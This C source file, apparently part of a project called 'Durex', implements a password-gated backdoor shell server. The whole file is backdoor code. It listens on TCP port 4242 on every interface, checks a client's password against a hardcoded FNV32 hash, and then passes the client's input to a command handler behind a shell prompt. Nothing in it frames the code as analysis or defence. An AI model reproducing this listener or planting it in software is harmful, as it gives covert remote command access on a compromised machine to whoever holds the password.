#include "Durex.h"

extern int _lock;

void launch_server(t_shell *shell)
{
    syslog(LOG_INFO, "STARTING server");
    if ((shell->ss = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        syslog(LOG_ALERT, "Cannot create socket");
        close(_lock);
        remove("/var/lock/durex.lock");
        exit(1);
    }
    if (setsockopt(shell->ss, SOL_SOCKET, SO_REUSEADDR, &shell->opt, sizeof(shell->opt)) < 0)
    {
        syslog(LOG_ALERT, "setsockopt error");
        close(_lock);
        remove("/var/lock/durex.lock");
        exit(1);
    }
    shell->server_addr.sin_family = AF_INET;
    shell->server_addr.sin_addr.s_addr = INADDR_ANY;
    shell->server_addr.sin_port = htons(shell->port);
    syslog(LOG_INFO, "Bind socket");
    if (bind(shell->ss, (struct sockaddr *)&shell->server_addr, sizeof(shell->server_addr)) < 0)
    {
        // Log.Log(LOG_ERR, "Cannot bind socket.");
        close(_lock);
        remove("/var/lock/matt_daemon.lock");
        exit(1);
    }
    if (listen(shell->ss, 3) < 0)
    {
        // Log.Log(LOG_ERR, "Cannot listen (3).");
        close(_lock);
        remove("/var/lock/matt_daemon.lock");
        exit(1);
    }
    syslog(LOG_INFO, "Listening");
}

void handle_clients(t_shell *shell)
{
    int addr_len;
    fd_set readfds;
    int max_sd;
    int sd;
    int client_socket[MAX_CLIENT];
    int client_validate[MAX_CLIENT];
    int activity;
    int new_socket;
    int i;
    int valread;
    char buffer[1024];

    addr_len = sizeof(shell->server_addr);
    client_socket[0] = 0;
    client_socket[1] = 0;
    client_socket[2] = 0;
    while (1)
    {
        memset(buffer, 0, sizeof(buffer));
        FD_ZERO(&readfds);
        FD_SET(shell->ss, &readfds);
        max_sd = shell->ss;
        syslog(LOG_INFO, "Select waiting");
        for (i = 0; i < MAX_CLIENT; i++)
        {
            //socket descriptor
            sd = client_socket[i];

            //if valid socket descriptor then add to read list
            if (sd > 0)
                FD_SET(sd, &readfds);

            //highest file descriptor number, need it for the select function
            if (sd > max_sd)
                max_sd = sd;
        }
        activity = select(max_sd + 1, &readfds, NULL, NULL, NULL);
        syslog(LOG_INFO, "Select waiting");
        if (activity < 0)
            syslog(LOG_INFO, "Select failed");
        if (FD_ISSET(shell->ss, &readfds))
        {
            if ((new_socket = accept(shell->ss,
                                     (struct sockaddr *)&shell->server_addr, (socklen_t *)&addr_len)) < 0)
            {
                syslog(LOG_ERR, "accept error");
                exit(EXIT_FAILURE);
            }
            if (send(new_socket, "password:", 9, 0) != 9)
            {
                syslog(LOG_ERR, "send error");
            }
            // puts("Welcome message sent successfully");
            // add new socket to array of sockets
            for (i = 0; i < MAX_CLIENT; i++)
            {
                //if position is empty
                if (client_socket[i] == 0)
                {
                    client_socket[i] = new_socket;
                    client_validate[i] = 0;
                    break;
                }
            }
        }
        for (i = 0; i < MAX_CLIENT; i++)
        {
            // if (client_validate[i] == 1)
                // send(sd, "$>", 2, 0);
            memset(buffer, 0, sizeof(buffer));
            sd = client_socket[i];
            if (FD_ISSET(sd, &readfds))
            {
                if ((valread = recv(sd, buffer, 1024, 0)) == 0)
                {
                    syslog(LOG_INFO, "buff{%s}", buffer);
                    //Somebody disconnected , get his details and print
                    getpeername(sd, (struct sockaddr *)&shell->server_addr,
                                (socklen_t *)&addr_len);

                    //Close the socket and mark as 0 in list for reuse
                    close(sd);
                    client_socket[i] = 0;
                }
                else
                {
                    if (valread > 1)
                        buffer[valread - 1] = '\0';
                    else
                        buffer[1] = '\0';
                    syslog(LOG_INFO, "buffer : [%s]", buffer);
                    if (client_validate[i] == 0)
                    {
                        char pass[12];
                        memset(pass, 0, sizeof(pass));
                        sprintf(pass, "%d", FNV32(buffer));
                        if (strcmp(pass, "1298295291") == 0)
                        {
                            send(sd, "Congratz\n$>", 11, 0);
                            client_validate[i] = 1;
                        }
                        else
                            send(sd, "Wrong\npassword:", 15, 0);
                    }
                    else
                    {
                        // evaluate builtin;
                        builtin(sd, buffer);
                        // send(sd, buffer, strlen(buffer), 0);
                    }
                }
            }
        }
    }
}

void shell()
{
    t_shell *shell;

    shell = malloc(sizeof(t_shell));
    if (!shell)
        exit(1);
    memset(shell, 0, sizeof(t_shell));

    shell->opt = 1;
    shell->port = 4242;
    launch_server(shell);
    handle_clients(shell);
}